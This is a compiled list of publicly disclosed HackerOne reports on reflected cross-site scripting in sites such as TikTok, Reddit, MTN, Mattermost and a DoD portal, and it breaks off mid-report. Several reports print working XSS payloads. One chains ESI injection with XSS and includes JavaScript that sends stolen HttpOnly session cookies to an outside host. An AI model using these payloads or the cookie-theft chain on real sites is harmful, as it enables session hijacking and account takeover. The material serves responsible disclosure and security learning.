# Cross-site Scripting (XSS) - Reflected

_51 reports — High/Critical, disclosed_

### [XSS on Amazon Aquisition:  elemental](https://hackerone.com/reports/3205667)

- **Report ID:** `3205667`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Reflected
- **Program:** AWS VDP
- **Reporter:** @muhammad_kasim
- **Bounty:** - usd
- **Disclosed:** 2025-07-22T00:48:09.032Z
- **CVE(s):** -

**Summary (team):**

Hi Kasim, thank you for submitting this report and for validating that it was fully addressed.

---

### [Reflected - XSS](https://hackerone.com/reports/1779447)

- **Report ID:** `1779447`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Reflected
- **Program:** MTN Group
- **Reporter:** @vidaamuyarchi
- **Bounty:** - usd
- **Disclosed:** 2024-10-21T10:13:27.781Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
Hi, Team I'm Found Reflected XSS

## Steps To Reproduce:

1.Nave to https://www.mtn.bj/
2.Go to Messages 
3. Enter XSS Payload :

    * <h1 onauxclick=confirm(document.domain)>RIGHT CLICK HERE

4. Reflected the popup

## Impact

Cross site scripting attacks can have devastating consequences. Code injected into a vulnerable application can exfiltrate data or install malware on the user's machine. Attackers can masquerade as authorized users via session cookies, allowing them to perform any action allowed by the user account.

**Summary (researcher):**

POC Video :- https://youtu.be/HLshcsX1GwU?si=BM0VLLNjbM8ZwBbi

* https://youtu.be/gT-0RwW0mRM?si=yUhC-N1Hk33pcBwj

---

### [Reflected XSS in https://nin.mtn.ng/nin/success?message=lol&nin=<VULNERABLE>](https://hackerone.com/reports/2039384)

- **Report ID:** `2039384`
- **Severity:** Critical
- **Weakness:** Cross-site Scripting (XSS) - Reflected
- **Program:** MTN Group
- **Reporter:** @hazemhussien99
- **Bounty:** - usd
- **Disclosed:** 2024-10-05T10:27:41.138Z
- **CVE(s):** -

**Vulnerability Information:**

###Summary:
Hello team,
Found a reflected XSS on one your domains i believe https://nin.mtn.ng/nin/success?message=msg&nin= as the nin parameter is vulnerable.
Please check the following PoC:
Run the following command from a terminal:
curl -ski "https://nin.mtn.ng/nin/success?message=lol&nin=<script>alert(1)</script>"  | grep "alert"
{F2446627}

I reported this before in report #1737682 but it was closed as resolved while still vulnerable.

## Impact

Attacker could execute js in the victim's browser.

---

### [Reflected XSS on Pangle Endpoint ](https://hackerone.com/reports/2352968)

- **Report ID:** `2352968`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Reflected
- **Program:** TikTok
- **Reporter:** @3x3_
- **Bounty:** 5000 usd
- **Disclosed:** 2024-04-05T00:20:16.465Z
- **CVE(s):** -

**Summary (team):**

A cross-site scripting (XSS) vulnerability was found at the Pangle endpoint via the 'redirect' parameter. This was caused by the reflection of user-supplied data without appropriate HTML escaping or output encoding. As a result, a JavaScript payload could have been returned by the above endpoint and executed within a user's browser. We saw no evidence of exploitation before the vulnerability was fixed and additional mitigations applied. We thank @m7x for reporting this to our team and confirming its remediation.

---

### [CRLF to XSS & Open Redirection](https://hackerone.com/reports/2012519)

- **Report ID:** `2012519`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Reflected
- **Program:** TikTok
- **Reporter:** @ashrafabdelrazik
- **Bounty:** - usd
- **Disclosed:** 2023-08-16T00:18:34.665Z
- **CVE(s):** -

**Summary (team):**

Due to inadequate input validation, it could have been possible to inject CRLF (HTTP Response Splitting) into the parameter "__hack_redirect_now__ " on a TikTok seller endpoint. This could have led to Reflective XSS (Cross-Site Scripting) to gain access to a user's cookies, or the ability to send users to unauthorized webpages ending in "tiktok.com" via an open redirect. This vulnerability has been resolved. We thank @ashrafabdelrazik for reporting this to our team.

---

### [Reflected Cross-Site Scripting(CVE-2022-32770 )](https://hackerone.com/reports/1844777)

- **Report ID:** `1844777`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Reflected
- **Program:** Rocket.Chat
- **Reporter:** @sachinrajput
- **Bounty:** - usd
- **Disclosed:** 2023-06-22T18:00:49.971Z
- **CVE(s):** CVE-2022-32770

**Summary (team):**

The researcher has found a XSS  vulnerability  inside our https://video.rocket.chat.

---

### [Reflected Cross-site Scripting (XSS) at https://www.tiktok.com/](https://hackerone.com/reports/1915808)

- **Report ID:** `1915808`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Reflected
- **Program:** TikTok
- **Reporter:** @mrhavit
- **Bounty:** - usd
- **Disclosed:** 2023-06-02T21:30:39.692Z
- **CVE(s):** -

**Summary (team):**

A Cross-Site Scripting (XSS) vulnerability was found on a TikTok.com endpoint via the 'link' parameter, which could have resulted in the ability to execute JavaScript code within a user's browser. We thank @mrhavit for reporting this to the team.

---

### [XSS at TikTok Ads Endpoint](https://hackerone.com/reports/1683129)

- **Report ID:** `1683129`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Reflected
- **Program:** TikTok
- **Reporter:** @s3c
- **Bounty:** - usd
- **Disclosed:** 2023-01-27T17:16:32.595Z
- **CVE(s):** -

**Summary (team):**

A Cross-Site Scripting (XSS) vulnerability was found on a TikTok Ads endpoint, due to a lack of appropriate HTML escaping or output encoding on the reflection of user-supplied data, which was resolved on September 7, 2022. This could have resulted in a JavaScript payload injected into the endpoint causing it to be executed within the context of the victim's browser. We thank @s3c for reporting this to our team.

**Summary (researcher):**

I found a Cross-site scripting (XSS) and bypassed the WAF (akamai) on one of the TikTok ads endpoints and could lead it to takeover any account on ads.tiktok.com

---

### [[hta3] Chain of ESI Injection & Reflected XSS leading to Account Takeover on [███]](https://hackerone.com/reports/1073780)

- **Report ID:** `1073780`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Reflected
- **Program:** U.S. Dept Of Defense
- **Reporter:** @jr0ch17
- **Bounty:** - usd
- **Disclosed:** 2022-10-14T13:44:31.544Z
- **CVE(s):** -

**Vulnerability Information:**

Hi,

## Summary
There is an **ESI injection** vulnerability in the [https://████████/portal/page/portal/TOPLEVELSITE/SearchResults/PerspectiveResults](https://████/portal/page/portal/TOPLEVELSITE/SearchResults/PerspectiveResults) endpoint on the **ms** parameter. With this injection, we're able to extract session cookies that have the HttpOnly flag by using this payload.

```xml
<esi:vars>$(HTTP_HEADER{Cookie})</esi:vars>
```

We also found a **Reflected XSS** vulnerability in the [https://████████/portal/pls/portal/PORTAL.wwexp_render.show_tree](https://████████/portal/pls/portal/PORTAL.wwexp_render.show_tree) endpoint on the **title** parameter

By chaining these 2 bugs together, we're able to steal session cookies and take over a victim user's account.
&nbsp;

## Steps To Reproduce
1- By browsing here `https://████████/portal/page/portal/TOPLEVELSITE/SearchResults/PerspectiveResults?osf=&ms=lol<esi:vars>$(HTTP_HEADER{Cookie})</esi:vars>lol&mo=containsall&pg=&sepg=-1&fi=&fs=&ft=&pu=1&has=&as=17%2C0%3B48%2C0&saa=ALL&po=matchall&pi=&pc=&co=equal&ci=&p_action=SUBMIT&ll=`, we're able to see your cookies in the **Search** field between the `lol` strings at the beginning and end.
█████████
2- When browsing here, `https://█████████/portal/pls/portal/PORTAL.wwexp_render.show_tree?p_otype=SITEMAP&p_request=open&p_minusimage=&p_plusimage=&p_headerimage=%2Fimages%2Fbhfind2.gif&p_show_banner=NO&p_show_cancel=NO&p_open_item=1.FOLDER.FOLDERMAP.1_0&p_open_items=0.SITEMAP.FOLDERMAP.0_-1&p_domain=wwc&p_sub_domain=FOLDERMAP&p_title=Browse+Pages</title><svg/onload=alert(domain)>&p_datasource_data=document.SEARCH60_PAGESEARCH_362193163.ft&p_datasource_data=document.SEARCH60_PAGESEARCH_362193163.fi&p_datasource_data=document.SEARCH60_PAGESEARCH_362193163.fs&p_datasource_data=nls_sub_domain%3Dtext%2Cnls_name%3Dfolderplpopup`, we can see an alert box showing the vulnerable domain caused by this HTML and JavaScript code in the **title** parameter.

```html
</title><svg/onload=alert(domain)>
```

████████

3- To chain these 2 bugs together, we created the following PoC. This JavaScript code is fetching the URL containing the ESI injection, grabbing the value of the cookies in the response and then sending them over to our server in order to steal them.

```javascript
fetch('https://████████/portal/page/portal/TOPLEVELSITE/SearchResults/PerspectiveResults?osf=&ms=lol<esi:vars>$(HTTP_HEADER{Cookie})</esi:vars>lol&mo=containsall&pg=&sepg=-1&fi=&fs=&ft=&pu=1&has=&as=17%2C0%3B48%2C0&saa=ALL&po=matchall&pi=&pc=&co=equal&ci=&p_action=SUBMIT&ll=').then(function (response) {
		return response.text();
}).then(function (html) {

	var parser = new DOMParser();
	var doc = parser.parseFromString(html, 'text/html');
  
  //var input = doc.querySelector('input')[0];
  var cookies = doc.getElementById("x61_ms").value;
  fetch(`https://www.jr0ch17.com/ato?cookies=${cookies}`);

}).catch(function (err) {
	// There was an error
	console.warn('Something went wrong.', err);
});
```

To trigger this whole PoC, you can browse to this URL. You can replace the server with your own to reproduce it.

```
https://████████/portal/pls/portal/PORTAL.wwexp_render.show_tree?p_otype=SITEMAP&p_request=open&p_minusimage=&p_plusimage=&p_headerimage=%2Fimages%2Fbhfind2.gif&p_show_banner=NO&p_show_cancel=NO&p_open_item=1.FOLDER.FOLDERMAP.1_0&p_open_items=0.SITEMAP.FOLDERMAP.0_-1&p_domain=wwc&p_sub_domain=FOLDERMAP&p_title=Browse+Pages</title><script/src='https://www.jr0ch17.com/hta3.js'></script>&p_datasource_data=document.SEARCH60_PAGESEARCH_362193163.ft&p_datasource_data=document.SEARCH60_PAGESEARCH_362193163.fi&p_datasource_data=document.SEARCH60_PAGESEARCH_362193163.fs&p_datasource_data=nls_sub_domain%3Dtext%2Cnls_name%3Dfolderplpopup
```

As you can see, the XSS payload is now the following.

```html
</title><script/src='https://www.jr0ch17.com/hta3.js'>
```

We can then see that we have received the victim's cookies including the session cookie which has the HttpOnly flag.
██████████
&nbsp;

## Impact

By chaining these 2 vulnerabilities together and by tricking a victim user into clicking a link, an attacker is able to steal their session cookies which have the HttpOnly flag and take over their account. With an ESI injection and depending on the configuration, it's also potentially possible to get an SSRF and get access to internal resources. We're still exploring that area of the bug at the moment so we'll provide updates on if we're able to get further with it.

Let me know if you have any questions or require more details.

Thanks,
@jr0ch17

---

### [XSS Reflected on reddit.com via url path](https://hackerone.com/reports/1051373)

- **Report ID:** `1051373`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Reflected
- **Program:** Reddit
- **Reporter:** @criptex
- **Bounty:** - usd
- **Disclosed:** 2022-09-27T16:04:21.641Z
- **CVE(s):** -

**Vulnerability Information:**

Hi I found a XSS-R

To reproduce the issue please click the poc link and then press the "verify email" button

PoC:

https://www.reddit.com/verification/asd',%20alert(document.location),%20%27

## Impact

With the help of XSS an attacker can steal your cookies, in many cases steal sessions, download malware onto your system and send a custom request.
Users can be socially engineered by the attacker by redirecting them from the real website to a fake one and there are many more attack scenarios that an expert attacker can perform with XSS.
It is also possible to inject html thus modifying the original page

---

### [Reflected xss on videostore.mtnonline.com](https://hackerone.com/reports/1646248)

- **Report ID:** `1646248`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Reflected
- **Program:** MTN Group
- **Reporter:** @possowski
- **Bounty:** - usd
- **Disclosed:** 2022-09-25T19:10:11.387Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
Hi,
I found reflected xss vuln on videostore.mtnonline.com

## Steps To Reproduce:
  1. Open browser
  2. Go to ``https://videostore.mtnonline.com/GL/Default.aspx?PId=126&CId=5&OprId=11&Ctg=OF25MTNNGVS_LapsInTime%22%27testxxx%3E%3Ciframe%20src=%22data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E%22%3E%3C/iframe%3E`` url
 3. Browser show alert popup

## Impact

We can run javascript code

---

### [Shop - Reflected  XSS  With  Clickjacking Leads to Steal User's Cookie  In Two Domain](https://hackerone.com/reports/1221942)

- **Report ID:** `1221942`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Reflected
- **Program:** Meredith
- **Reporter:** @error201
- **Bounty:** - usd
- **Disclosed:** 2022-09-14T16:12:57.122Z
- **CVE(s):** -

**Vulnerability Information:**

Hii  Security Team ,

I am S Rahul MCEH(Metaxone Certified Ethical Hacker) and a Security Researcher I just checked your website and found Reflected XSS to Good XSS Clickjacking In Two Domain

Description:- As the search parameter is vulnerable to XSS and but the plus point is there is  no X-Frame-Header or Click-jacking Protection.So by combing this two methods the Attack Easier And Converted it to Well Working XSS on Other User’s . 

Vulnerable Urls:- https://marthastewart.com/shop/all.html?s=
                            https://bhg.com/shop/all.html?s=
		
Steps to reproduce :-
1. Navigate to  Vulnerable URLS and As we know that ?s= parameter is vulnerable to XSS 

2.As Reflected XSS Occurs on :-
	Example1 :-  https://bhg.com/shop/all.html?s=%E2%80%98);%3C/script%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E
	Example2 :-  https://marthastewart.com/shop/all.html?s=%E2%80%98);%3C/script%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E

3.The attacker can use different Payloads like document.domain etc 

4.Now as we know there is no X-Frame-Header or Click-jacking Protection that can leads to successful attack

5.Now we will create POC.html to send the victim and steal the cookies of the other users { POC.html is attached below }

6.Now as the victim opens the POC.html the attacker will get the cookies of the users or victim

Refernces:-
https://arbazhussain.medium.com/self-xss-to-good-xss-clickjacking-6db43b44777e
https://hackerone.com/reports/470206
https://hackerone.com/reports/892289

## Impact

Impact
By exploiting this Vulnerability
1.An attacker can force the customer to execute XSS and Steal user's cookie.
2.Launch advanced phishing attacks by rendering arbitrary HTML forms.
3.Force users to download malware/viruses.
4.Execute browser-based attacks etc.

---

### [cross site scripting in : mtn.bj](https://hackerone.com/reports/1264834)

- **Report ID:** `1264834`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Reflected
- **Program:** MTN Group
- **Reporter:** @alimanshester
- **Bounty:** - usd
- **Disclosed:** 2022-08-06T11:19:10.472Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
Xss vulnerability in mtn.bj  in file name 

## Steps To Reproduce:


  1.Go to : 
https://www.mtn.bj/business/ressources/formulaires/plan-de-localisation-de-compte/?next=https://www.mtn.bj/business/ressources/formulaires/formulaire-de-souscription/
  2 - fill all inputs with any data 
3 - in file upload upload a file with payload file name such as : "><img src=x onerror=alert(document.cookie);.jpg

4-the payload will executed in the page .

## Supporting Material/References:
1 - video showing poc 
2 - screen shot

## Impact

execute malicious java script in user browser

---

### [Corsa Site Scripting Vulnerability (XSS)](https://hackerone.com/reports/1650210)

- **Report ID:** `1650210`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Reflected
- **Program:** Linux Foundation Decentralized Trust
- **Reporter:** @bhaskar_ram
- **Bounty:** - usd
- **Disclosed:** 2022-07-30T14:37:57.621Z
- **CVE(s):** -

**Summary (team):**

An XSS was found in Cactus, a project that is not part of the bounty program.

---

### [[doc.rt.informaticacloud.com] Reflected XSS via Stack Strace](https://hackerone.com/reports/232320)

- **Report ID:** `232320`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Reflected
- **Program:** Informatica
- **Reporter:** @bigbear_
- **Bounty:** - usd
- **Disclosed:** 2022-07-23T11:03:56.509Z
- **CVE(s):** -

**Vulnerability Information:**

Hello.

###PoC for reflected XSS:

`http://doc.rt.informaticacloud.com/infocenter/ActiveVOS/v92/nav/7_1_2_3_2_1<svg/onload=alert(document.domain)>`

###Response:

```
<body><h2>HTTP ERROR 500</h2>
<p>Problem accessing /help/nav/7_1_2_3_2_1%3Csvg/onload=alert(document.domain)%3E. Reason:
<pre>    For input string: "1&lt;svg/onload=alert(document.domain)&gt;"</pre></p><h3>Caused by:</h3><pre>java.lang.NumberFormatException: For input string: "1<svg/onload=alert(document.domain)>"
	at java.lang.NumberFormatException.forInputString(NumberFormatException.java:65)
	at java.lang.Integer.parseInt(Integer.java:492)
	at java.lang.Integer.parseInt(Integer.java:527)
	at org.eclipse.help.internal.webapp.servlet.NavServlet.getTopic(NavServlet.java:90)
	at org.eclipse.help.internal.webapp.servlet.NavServlet.doGet(NavServlet.java:56)
	at javax.servlet.http.HttpServlet.service(HttpServlet.java:707)
	at javax.servlet.http.HttpServlet.service(HttpServlet.java:820)
	at org.eclipse.equinox.http.registry.internal.ServletManager$ServletWrapper.service(ServletManager.java:180)
	at org.eclipse.equinox.http.servlet.internal.ServletRegistration.handleRequest(ServletRegistration.java:90)
	at org.eclipse.equinox.http.servlet.internal.ProxyServlet.processAlias(ProxyServlet.java:111)
	at org.eclipse.equinox.http.servlet.internal.ProxyServlet.service(ProxyServlet.java:67)
	at javax.servlet.http.HttpServlet.service(HttpServlet.java:820)
	at org.eclipse.equinox.http.jetty.internal.HttpServerManager$InternalHttpServiceServlet.service(HttpServerManager.java:318)
	at org.mortbay.jetty.servlet.ServletHolder.handle(ServletHolder.java:502)
	at org.mortbay.jetty.servlet.ServletHandler.handle(ServletHandler.java:380)
	at org.mortbay.jetty.servlet.SessionHandler.handle(SessionHandler.java:181)
	at org.mortbay.jetty.handler.ContextHandler.handle(ContextHandler.java:765)
	at org.mortbay.jetty.handler.HandlerWrapper.handle(HandlerWrapper.java:152)
	at org.mortbay.jetty.Server.handle(Server.java:324)
	at org.mortbay.jetty.HttpConnection.handleRequest(HttpConnection.java:535)
	at org.mortbay.jetty.HttpConnection$RequestHandler.headerComplete(HttpConnection.java:865)
	at org.mortbay.jetty.HttpParser.parseNext(HttpParser.java:540)
	at org.mortbay.jetty.HttpParser.parseAvailable(HttpParser.java:213)
	at org.mortbay.jetty.HttpConnection.handle(HttpConnection.java:404)
	at org.mortbay.io.nio.SelectChannelEndPoint.run(SelectChannelEndPoint.java:409)
	at org.mortbay.thread.QueuedThreadPool$PoolThread.run(QueuedThreadPool.java:520)
```

It is succeful worked in IE/MozillaFirefox.
{F188420}

###Possible Fix:

Disable Stack Trace on this resource.

---

### [fix(cmd-socketio-server): mitigate cross site scripting attack #2068](https://hackerone.com/reports/1638984)

- **Report ID:** `1638984`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Reflected
- **Program:** Linux Foundation Decentralized Trust
- **Reporter:** @bhaskar_ram
- **Bounty:** 100 usd
- **Disclosed:** 2022-07-21T20:37:05.162Z
- **CVE(s):** -

**Vulnerability Information:**

Please refer this fix and approve Bounty.

See this In Github [Security Fix](https://github.com/hyperledger/cactus/pull/2068)

@ryjones

(https://github.com/hyperledger/cactus/pull/2068#issuecomment-1186157206)

## Impact

fix(cmd-socketio-server): mitigate cross site scripting attack

---

### [POST BASED REFLECTED XSS IN dailydeals.mtn.co.za](https://hackerone.com/reports/1451394)

- **Report ID:** `1451394`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Reflected
- **Program:** MTN Group
- **Reporter:** @shuvam321
- **Bounty:** - usd
- **Disclosed:** 2022-07-15T09:56:35.123Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
Dear Team ,
I have found a post based reflected XSS in https://dailydeals.mtn.co.za/ .

## Steps To Reproduce:

1.Create a html file with following content .

<form action="https://dailydeals.mtn.co.za/index.cfm?GO=CRAVE_ESTABLISHMENTS_LIST" method="POST"><input type="hidden" name="location_id" value="0"><input type="hidden" name="suburb" value="0"><input type="hidden" name="search_phrase" value=""><input type="hidden" name="submit_search" value="Search"><input type="hidden" name="m" value=""><input type="hidden" name="cpID" value=""><input type="hidden" name="CFID" value="a611fd5d-822a-4c08-a032-bcac1551f032'&quot;<!--><Svg OnLoad=(confirm)(1)-->"><input type="hidden" name="CFTOKEN" value="0"></form><script>document.forms[0].submit()</script>

2.Open the HTML file in any web-browser. 
  
3.Cross site Scripting will be triggered .

## Impact

Attacker can exploit this vulnerability to steal users cookies , redirect them to arbitrary domain and perform various attacks.

---

### [Reflected xss in https://sh.reddit.com](https://hackerone.com/reports/1549206)

- **Report ID:** `1549206`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Reflected
- **Program:** Reddit
- **Reporter:** @abhiramsita
- **Bounty:** 5000 usd
- **Disclosed:** 2022-05-08T07:36:43.558Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
Reflected cross-site scripting (or XSS) arises when an application receives data in an HTTP request and includes that data within the immediate response in an unsafe way.

## Impact:
attacker can execute malicious java script and steal cookies 

## Steps To Reproduce:
[add details for how we can reproduce the issue]

Hi team ,

Navigate to below url 
scroll to page end find a option see more
Move mouse over there and observe the execution of javascript 
## Supporting Material/References:
[list any additional material (e.g. screenshots, logs, etc.)]

  * [attachment / reference]

## Impact

attacker can execute malicious java script and steal cookies

---

### [Reflected xss on ads.tiktok.com using `from` parameter.](https://hackerone.com/reports/1452375)

- **Report ID:** `1452375`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Reflected
- **Program:** TikTok
- **Reporter:** @imran_nisar
- **Bounty:** - usd
- **Disclosed:** 2022-02-09T01:12:53.593Z
- **CVE(s):** -

**Summary (team):**

A XSS (cross-site scripting) vulnerability was found on a TikTok ads endpoint using the "from" parameter. We thank @imran_nisar for reporting this to our team and confirming its resolution.

---

### [Reflected xss в m.vk.com/chatjoin](https://hackerone.com/reports/316475)

- **Report ID:** `316475`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Reflected
- **Program:** VK.com
- **Reporter:** @executor
- **Bounty:** 500 usd
- **Disclosed:** 2021-11-05T16:07:22.183Z
- **CVE(s):** -

**Summary (team):**

XSS в мобильных сообщениях.

---

### [Reflected Cross-Site scripting in : mtn.bj](https://hackerone.com/reports/1264832)

- **Report ID:** `1264832`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Reflected
- **Program:** MTN Group
- **Reporter:** @alimanshester
- **Bounty:** - usd
- **Disclosed:** 2021-09-26T12:59:03.117Z
- **CVE(s):** -

**Vulnerability Information:**

Hello Team 
I have found a Reflected XSS vulnerability in mtn.jb by file name 


## Steps To Reproduce:
[add details for how we can reproduce the issue]

  1. go to : 
████
  2. enter any email and press  Suivant
  3. fill all the inputs by any data .
  4. in file upload upload any photo with payload file name : "><img src=x onerror=alert(document.cookie);.jpg

  5 . the payload executed in the page  


Supporting Material/References:
1 - video showing poc 
2 - screenshot

## Impact

An attacker can use XSS to send a malicious script to an unsuspecting user. The end user’s browser has no way to know that the script should not be trusted, and will execute the script. Because it thinks the script came from a trusted source, the malicious script can access any cookies, session tokens, or other sensitive information retained by the browser and used with that site. These scripts can even rewrite the content of the HTML page

**Summary (researcher):**

Writeup : 
██████████

---

### [Mattermost Server OAuth Flow Cross-Site Scripting](https://hackerone.com/reports/1216203)

- **Report ID:** `1216203`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Reflected
- **Program:** Mattermost
- **Reporter:** @shielder
- **Bounty:** 900 usd
- **Disclosed:** 2021-08-06T14:01:32.171Z
- **CVE(s):** CVE-2021-37859

**Vulnerability Information:**

## Summary:
The vulnerability is a reflected Cross-Site Scripting (XSS) via the OAuth flow. A victim clicking a malicious link pointing to the target Mattermost host will trigger the XSS. If the victim is a regular user, it is possible to obtain all of their Mattermost chat contents; if it’s an administrator, it is possible to create a new administrator.

## Root Cause Analysis:
The application fails to sanitize an HTTP query parameter before reflecting it within the HTML response during the OAuth flow.

```go=280
        if props != nil {
                action = props["action"]
                isMobile = action == model.OAUTH_ACTION_MOBILE
                if val, ok := props["redirect_to"]; ok {
[1]                     redirectURL = val
                        hasRedirectURL = redirectURL != ""
                }
        }
        renderError := func(err *model.AppError) {
                if isMobile && hasRedirectURL {
[2]                     utils.RenderMobileError(c.App.Config(), w, err, redirectURL)
                } else {
                        utils.RenderWebAppError(c.App.Config(), w, r, err, c.App.AsymmetricSigningKey())
                }
        }
```

The file "/web/oauth.go" (https://github.com/mattermost/mattermost-server/blob/master/web/oauth.go) contains the function "completeOAuth" which on line 284 values the variable "redirectURL" with the parameter "redirect_to" [1] of the query string of the HTTP GET request. Subsequently always inside of the same function to the line 291 comes called the function "utils.RenderMobileError" to which it comes passed like argument the variable "redirectURL" [2].

```go=103
func RenderMobileError(config *model.Config, w http.ResponseWriter, err *model.AppError, redirectURL string) {
        RenderMobileMessage(w, `
                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512" style="width: 64px; height: 64px; fill: #ccc">
                        <!-- Font Awesome Free 5.15.3 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) -->
                        <path d="M569.517 440.013C587.975 472.007 564.806 512 527.94 512H48.054c-36.937 0-59.999-40.055-41.577-71.987L246.423 23.985c18.467-32.009 64.72-31.951 83.154 0l239.94 416.028zM288 354c-25.405 0-46 20.595-46 46s20.595 46 46 46 46-20.595 46-46-20.595-46-46-46zm-43.673-165.346l7.418 136c.347 6.364 5.609 11.346 11.982 11.346h48.546c6.373 0 11.635-4.982 11.982-11.346l7.418-136c.375-6.874-5.098-12.654-11.982-12.654h-63.383c-6.884 0-12.356 5.78-11.981 12.654z"/>
                </svg>
                <h2> `+i18n.T("error")+` </h2>
                <p> `+err.Message+` </p>
[1]                <a href="`+redirectURL+`">
                        `+i18n.T("api.back_to_app", map[string]interface{}{"SiteName": config.TeamSettings.SiteName})+`
                </a>
        `)
}
```

The function "RenderMobileError" is contained within the file "utils/api.go" (https://github.com/mattermost/mattermost-server/blob/master/utils/api.go) at line 103, and the fourth argument of this function is "redirectURL". At line 104 the "RenderMobileMessage" function is called and at line 111 the variable "redirectURL" is concatenated (without being sanitised) with another string argument of the "RenderMobileMessage" function [1].

```go=157
[...]
                        </head>
                        <body>
                                <!-- mobile app message -->
                                <div class="message-container">
[1]                                     `+message+`
                                </div>
                        </body>
                </html>
        `)
```

Inside the "RenderMobileMessage" function (declared at line 117 of utils/api.go) "fmt.Fprintln" is called to print the HTTP response and the HTML page is dynamically built concatenating the "message" variable [1] (second argument of the function).

Call graph:
completeOAuth -(redirectURL=redirect_to)-> util.RenderMobileError(*,redirectURL) -(message=string+redirectURL)-> RenderMobileMessage(*,message) -> fmt.Fprintln(string+message)

Since the HTTP GET request parameter "redirect_to" is never sanitized and is appended to the HTML page, it is possible to trigger a reflected XSS.

## Steps To Reproduce:
1. Visit the following URL after replacing <mattermost_url> with the domain/ip of the mattermost server instance:
https://<mattermost_url>/oauth/shielder/mobile_login?redirect_to=%22%3E%3Cimg%20src=%22%22%20onerror=%22alert(%27zi0Black%20@%20Shielder%27)%22%3E

2. Notice the JavaScript's generated pop-up

## Supporting Material/References:
  * [attachment / F1324661]

## Impact

The following attack scenarios have been identified:
- If the victim is a regular user, the attacker could read the messages sent and received by the user.
- If the victim is an administrative user, the attacker could change the server settings (e.g. add a new administrative user).

**Summary (researcher):**

[Andrea \`zi0black\` Cappa](https://twitter.com/zi0black) of [Shielder](https://twitter.com/ShielderSec) found a Reflected Cross-Site Scripting (XSS) in the OAuth authentication flow of Mattermost. Once fixed he found a bypass for it which was promptly fixed by the Mattermost team.

The vulnerability could have been abused to hijack a victim session and based on their privileges steal their conversations / send messages (user) and/or add a new administrator on the Mattermost instance (admin).

All the details are available in the advisory published on Shielder's website: https://www.shielder.it/advisories/mattermost-server-reflected-xss-oauth/

---

### [Cross site scripting  ](https://hackerone.com/reports/1095797)

- **Report ID:** `1095797`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Reflected
- **Program:** Informatica
- **Reporter:** @rawezh_ali
- **Bounty:** - usd
- **Disclosed:** 2021-05-17T13:56:29.319Z
- **CVE(s):** -

**Summary (team):**

Researcher identified a XSS vulnerability in a service used by Informatica. Informatica worked with the vendor to patch their service for us and all other customers of the vendor. 

Thanks rawezh_ali for your responsible disclosure.

---

### [Reflected/Stored XSS on duckduckgo.com](https://hackerone.com/reports/1110229)

- **Report ID:** `1110229`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Reflected
- **Program:** DuckDuckGo
- **Reporter:** @monke
- **Bounty:** - usd
- **Disclosed:** 2021-04-10T18:15:50.202Z
- **CVE(s):** -

**Vulnerability Information:**

Hi DuckDuckGo,

While browsing normally (since I use DuckDuckGo on a daily basis), I discovered an interesting stored XSS on the duckduckgo main search engine. A payload that somebody had left on urbandictionary.com had triggered a HTML injection, and a stored XSS as a result. 

**Steps to Reproduce**
1. Search the following in the searchbar of DuckDuckGo: `urban dictionary "><img src=x<`
2. A payload left by someone else will render itself and fire in the main DuckDuckGo page.
3. It is also possible to visit the page via the DuckDuckGo URL as [such](https://duckduckgo.com/?q=urban+dictionary+%22%3E%3Cimg+src%3Dx%3C&t=ffab&atb=v1-1&ia=web) and the XSS will trigger.

**POC**
- The page itself renders HTML. The payload fires.
- {F1207848}
- {F1207849}

## Impact

There are several impacts here.
- Firstly, the DuckDuckGo URL serves as a payload, because simply visiting the page with the right search parameter triggers the XSS, although the search parameters themselves do not directly trigger it. 
- Secondly, the XSS is stored in the search results, so this can be considered to be Stored XSS.
- It is possible to execute any Javascript via the main DuckDuckGo page.

If you have any questions or require clarification, I am happy to help.
Cheers,
PMOC

**Summary (researcher):**

Writeup here: https://monke.ie/duckduckgoxss/

---

### [Reflected XSS on transact.playstation.com using postMessage from the opening window](https://hackerone.com/reports/900619)

- **Report ID:** `900619`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Reflected
- **Program:** PlayStation
- **Reporter:** @vakzz
- **Bounty:** 1000 usd
- **Disclosed:** 2021-03-30T04:19:51.469Z
- **CVE(s):** -

**Summary (team):**

## Report Summary:
When `transact.playstation.com` loads it handles messages received from `postMessage` in the `_receiveMessageFromTransactClientService` method. The only validation that is performed is to ensure that the referrer and origin match:

```javascript
_receiveMessageFromTransactClientService: function (e) {
          var n = void 0,
            r = this.get("replaceRoute"),
            i = this.get("referrer");
          if (!i || e.origin === (0, t.default)(i)) {
            try {
